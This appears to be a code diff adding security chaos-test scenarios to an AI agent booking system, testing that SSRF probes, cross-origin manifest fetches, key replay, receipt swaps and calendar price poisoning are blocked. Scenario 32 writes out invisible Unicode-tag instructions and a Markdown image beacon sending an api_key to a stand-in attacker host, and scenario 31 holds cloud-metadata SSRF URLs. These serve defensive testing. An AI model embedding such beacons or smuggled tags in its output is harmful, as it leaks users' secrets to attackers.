@@ -32,9 +32,19 @@ import {
   signProviderReceipt,
 } from "../proof-verifier/index.js";
 import { SagaCoordinator } from "../saga-engine/index.js";
-import { AuthorityBoundResolver, resolveAndRouteNandaReach } from "../nanda-resolver/index.js";
+import { OP_STATES, reconcileOperationOutcome } from "../outcome-reconciliation/index.js";
+import {
+  auditOpenAgenticSite,
+  AuthorityBoundResolver,
+  isSafePublicOrLoopbackUrl,
+  resolveAndRouteNandaReach,
+} from "../nanda-resolver/index.js";
 import { issuePolicyBoundMandate, SealedBidArbiter } from "../mandate-arbiter/index.js";
-import { exportVerifiableAuditBundle, verifyExportedAuditBundle } from "../intake-compiler/index.js";
+import {
+  compileUnstructuredIntake,
+  exportVerifiableAuditBundle,
+  verifyExportedAuditBundle,
+} from "../intake-compiler/index.js";
 import {
   diffPeerNetworks,
   inspectPeerNetworkSafety,
@@ -1558,6 +1568,281 @@ export const CHAOS_SCENARIOS = [
         sagaStatus: solved2.recommendedPlanId,
         humanInterventionRequired: true,
         evidence: "Both consecutive day-shifts maintained invariants and preserved Storage & Saturday Delivery.",
+      };
+    },
+  },
+  {
+    id: "CHAOS_31_SSRF_CLOUD_METADATA_AND_CROSS_ORIGIN_HOCON_ESCAPE",
+    number: 31,
+    title: "SSRF Cloud Metadata Probe & Cross-Origin Manifest HOCON Escape Blocked",
+    injectedFailure: "Auditor receives http://169.254.169.254/ and a manifest pointing hocon to https://evil.example/steal.json.",
+    humanInterventionRequired: false,
+    async run() {
+      const metaCheck = isSafePublicOrLoopbackUrl("http://169.254.169.254/latest/meta-data/");
+      const numIpCheck = isSafePublicOrLoopbackUrl("https://2130706433/");
+      const crossOriginAudit = await auditOpenAgenticSite("https://peer-a.example/", async (url) => {
+        if (url.endsWith("agent-manifest.json")) {
+          return new Response(
+            JSON.stringify({ networks: [{ name: "n", front_man: "f", hocon: "https://internal-b.example/net.json" }] }),
+            { status: 200, headers: { "Content-Type": "application/json" } },
+          );
+        }
+        return new Response("{}", { status: 404 });
+      });
+      return {
+        simulation_mode: true,
+        passed: metaCheck.safe === false && numIpCheck.safe === false && crossOriginAudit.ok === false,
+        expectedTransition: "Metadata IP, integer IP, and cross-origin hocon all blocked before fetch",
+        observedState: "SSRF_CONTAINED",
+        sagaStatus: "ZERO_CONFUSED_DEPUTY_FETCH",
+        humanInterventionRequired: false,
+        evidence: "169.254.169.254, 2130706433 & cross-origin hocon path rejected.",
+      };
+    },
+  },
+  {
+    id: "CHAOS_32_UNICODE_TAG_AND_MARKDOWN_BEACON_EXFIL_BLOCKED",
+    number: 32,
+    title: "Unicode Tag Block ASCII Smuggling & Markdown Image Exfiltration Beacon Blocked",
+    injectedFailure: "Peer embeds U+E0041 invisible LLM tags and ![x](https://attacker.tld/b?api_key=...) in tool parameters.",
+    humanInterventionRequired: true,
+    async run() {
+      const scan = await inspectPeerNetworkSafety({
+        siteBaseUrl: "https://peer.example/",
+        manifestJson: { brand: "Peer", networks: [{ name: "p", front_man: "f" }] },
+        networkJson: {
+          tools: [
+            {
+              name: "f",
+              instructions: "Normal greeting \u{E0041}\u{E0042}",
+              function: {
+                description: "Helper",
+                parameters: { type: "object", properties: { q: { description: "![b](https://evil.tld/?api_key=x)" } } },
+              },
+            },
+          ],
+        },
+      });
+      return {
+        simulation_mode: true,
+        passed:
+          scan.safe === false
+          && scan.findings.some((f) => f.ruleId === "PF-TAG-SMUGGLING")
+          && scan.findings.some((f) => f.ruleId === "PF-MARKDOWN-BEACON-EXFIL"),
+        expectedTransition: "Both U+E0000 tags and parameter Markdown beacon blocked pre-execution",
+        observedState: "BLOCKED_BY_FIREWALL",
+        sagaStatus: "RISK_100_BLOCKED",
+        humanInterventionRequired: true,
+        evidence: `Blocked rules: ${scan.findings.map((f) => f.ruleId).join(", ")}`,
+      };
+    },
+  },
+  {
+    id: "CHAOS_33_UNSIGNED_COMMIT_AND_BOOKING_REF_SWAP_REJECTED",
+    number: 33,
+    title: "Missing Receipt Envelope & Cross-Booking Reference Swap Caught by Reconciler",
+    injectedFailure: "Provider returns HTTP 200 COMMITTED with signed receipt for booking MC-OTHER-999 instead of MC-8841.",
+    humanInterventionRequired: true,
+    async run() {
+      const kp = await generateDemoProviderKeyPair("moveco");
+      const verifier = new ReceiptVerifier({ moveco: { keyId: kp.keyId, publicJwk: kp.publicJwk } });
+      const wrongRefEnv = await signProviderReceipt(
+        {
+          provider_id: "moveco",
+          booking_ref: "MC-OTHER-999",
+          scheduled_date: "2026-11-20",
+          total_charged_eur: 415,
+          idempotency_key: "idem_33",
+        },
+        kp,
+      );
+      const res = await reconcileOperationOutcome({
+        expectedOp: {
+          provider_id: "moveco",
+          original_booking_ref: "MC-8841",
+          proposed_date: "2026-11-20",
+          base_price_eur: 390,
+          change_fee_eur: 25,
+          cancellation_penalty_eur: 0,
+          idempotency_key: "idem_33",
+        },
+        providerStatus: { execution_state: "COMMITTED", receipt_envelope: wrongRefEnv },
+        receiptVerifier: verifier,
+      });
+      return {
+        simulation_mode: true,
+        passed: res.outcomeState === OP_STATES.NEEDS_USER && res.verified === false,
+        expectedTransition: "DISPATCHED -> NEEDS_USER (booking_ref mismatch caught)",
+        observedState: res.outcomeState,
+        sagaStatus: "CROSS_BOOKING_SWAP_BLOCKED",
+        humanInterventionRequired: true,
+        evidence: res.discrepancies[0] || "Booking ref mismatch caught.",
+      };
+    },
+  },
+  {
+    id: "CHAOS_34_PARTIAL_PREPARE_HOLD_AUTO_ROLLBACK",
+    number: 34,
+    title: "Downstream Hold Refusal Automatically Releases Upstream Temporary Holds",
+    injectedFailure: "MoveCo secures hold_mc_1, then HomeConnect refuses hold; no orphan hold may remain on MoveCo.",
+    humanInterventionRequired: true,
+    async run() {
+      const mission = createSignatureMoveMission();
+      const graph = MissionGraph.fromMission(mission);
+      const saga = new SagaCoordinator({ graph });
+      const released = [];
+      const res = await saga.preparePlan({
+        missionId: mission.mission_id,
+        maximumBudgetEur: 700,
+        plan: {
+          operations: [
+            {
+              commitment_id: "cmt_moveco_van",
+              commitment_title: "Van",
+              original_booking_ref: "MC-8841",
+              original_date: "2026-11-17",
+              offer: {
+                offer_id: "o1",
+                provider_id: "moveco",
+                provider_name: "MoveCo",
+                provider_origin: "https://mc.example",
+                raw_capability: "reschedule",
+                semantic_kind: "RESCHEDULE_IN_PLACE",
+                proposed_date: "2026-11-20",
+                window: "08:00–12:00",
+                base_price_eur: 390,
+                change_fee_eur: 25,
+                cancellation_penalty_eur: 0,
+                supports_hold: true,
+                supports_idempotency: true,
+                supports_status_reconciliation: true,
+                reversible: false,
+                is_replacement_provider: false,
+              },
+            },
+            {
+              commitment_id: "cmt_homeconnect_fiber",
+              commitment_title: "Fiber",
+              original_booking_ref: "HC-5510",
+              original_date: "2026-11-17",
+              offer: {
+                offer_id: "o2",
+                provider_id: "homeconnect",
+                provider_name: "HomeConnect",
+                provider_origin: "https://hc.example",
+                raw_capability: "reschedule",
+                semantic_kind: "RESCHEDULE_IN_PLACE",
+                proposed_date: "2026-11-20",
+                window: "13:00–17:00",
+                base_price_eur: 49,
+                change_fee_eur: 0,
+                cancellation_penalty_eur: 0,
+                supports_hold: true,
+                supports_idempotency: true,
+                supports_status_reconciliation: true,
+                reversible: false,
+                is_replacement_provider: false,
+              },
+            },
+          ],
+        },
+        providerClients: {
+          moveco: {
+            prepareHold: async () => ({ ok: true, hold_id: "hold_mc_orphan_guard" }),
+            releaseHold: async ({ holdId }) => released.push(holdId),
+          },
+          homeconnect: {
+            prepareHold: async () => ({ ok: false, reason: "Technician unavailable" }),
+          },
+        },
+      });
+      return {
+        simulation_mode: true,
+        passed: res.ok === false && released.includes("hold_mc_orphan_guard"),
+        expectedTransition: "MoveCo PREPARED -> COMPENSATED (0 orphan holds left behind)",
+        observedState: "ZERO_ORPHAN_HOLDS",
+        sagaStatus: "CLEAN_PREPARE_ROLLBACK",
+        humanInterventionRequired: true,
+        evidence: `Rolled back holds: [${released.join(", ")}]`,
+      };
+    },
+  },
+  {
+    id: "CHAOS_35_PROVIDER_KEY_ROTATION_AND_COMPROMISED_KEY_REVOCATION",
+    number: 35,
+    title: "Live Ed25519 Key Rotation Ring & Compromised Key Revocation Enforcement",
+    injectedFailure: "Provider rotates k1 -> k2 and revokes compromised k1; attacker replays old receipt signed by k1.",
+    humanInterventionRequired: true,
+    async run() {
+      const k1 = await generateDemoProviderKeyPair("moveco");
+      const k2 = { ...(await generateDemoProviderKeyPair("moveco")), keyId: "demo-key-moveco-v2" };
+      const verifier = new ReceiptVerifier();
+      verifier.registerTrustedProviderKey("moveco", k1.keyId, k1.publicJwk);
+      verifier.registerTrustedProviderKey("moveco", k2.keyId, k2.publicJwk);
+      const env1 = await signProviderReceipt({ provider_id: "moveco", total_charged_eur: 415 }, k1);
+      const env2 = await signProviderReceipt({ provider_id: "moveco", total_charged_eur: 415 }, k2);
+      verifier.revokeProviderKey("moveco", k1.keyId);
+      const checkRevoked = await verifier.verifyReceipt("moveco", env1);
+      const checkActive = await verifier.verifyReceipt("moveco", env2);
+      return {
+        simulation_mode: true,
+        passed: checkRevoked.valid === false && checkActive.valid === true,
+        expectedTransition: "Revoked k1 rejected immediately; rotated k2 verified cleanly",
+        observedState: "KEY_RING_ENFORCED",
+        sagaStatus: "REVOKED_KEY_BLOCKED",
+        humanInterventionRequired: true,
+        evidence: `${checkRevoked.detail} | k2=${checkActive.level}`,
+      };
+    },
+  },
+  {
+    id: "CHAOS_36_ICS_VALARM_POISONING_AND_CROSS_MISSION_ZK_REPLAY",
+    number: 36,
+    title: "RFC 5545 Nested VALARM Description Poisoning & Cross-Mission ZK Budget Replay",
+    injectedFailure: ".ics embeds VALARM DESCRIPTION:'Price: €0' before booking DESCRIPTION:'Price: €390'; attacker replays Mission A ZK proof onto Mission B.",
+    humanInterventionRequired: false,
+    async run() {
+      const icsWithValarm = [
+        "BEGIN:VCALENDAR",
+        "VERSION:2.0",
+        "BEGIN:VEVENT",
+        "UID:MC-8841@mc",
+        "DTSTART:20261117T080000Z",
+        "DTEND:20261117T120000Z",
+        "SUMMARY:[ANCHOR] Moving Van",
+        "BEGIN:VALARM",
+        "ACTION:DISPLAY",
+        "DESCRIPTION:Reminder Price: €0",
+        "END:VALARM",
+        "DESCRIPTION:Ref: MC-8841 | Price: €390 | Reschedule fee: €25",
+        "END:VEVENT",
+        "BEGIN:VEVENT",
+        "UID:HC-5510@hc",
+        "DTSTART:20261117T140000Z",
+        "DTEND:20261117T170000Z",
+        "SUMMARY:Fiber Install",
+        "DESCRIPTION:Ref: HC-5510 | Price: €49 | After arrival",
+        "END:VEVENT",
+        "END:VCALENDAR",
+      ].join("\r\n");
+      const compiled = compileUnstructuredIntake(icsWithValarm);
+      const vanPrice = compiled.mission.commitments[0].price_eur;
+
+      const { publicCommitment, privateOpening } = await createBlindedBudgetCommitment({
+        ceilingEur: 700,
+        missionId: "mission_A",
+      });
+      const prf = await proveSpendWithinBlindedCeiling({ publicCommitment, privateOpening, spentEur: 500 });
+      const replayOnB = await verifyBlindedBudgetAttestation(prf.attestation, { expectedMissionId: "mission_B" });
+
+      return {
+        simulation_mode: true,
+        passed: vanPrice === 390 && replayOnB.valid === false,
+        expectedTransition: "VALARM stripped (real €390 preserved); cross-mission ZK proof rejected",
+        observedState: "VALARM_CLEAN_AND_ZK_SCOPED",
+        sagaStatus: "REPLAY_REJECTED",
+        humanInterventionRequired: false,
+        evidence: `Extracted van price=€${vanPrice}; ZK mission_B check=${replayOnB.reason}`,
       };
     },
   },
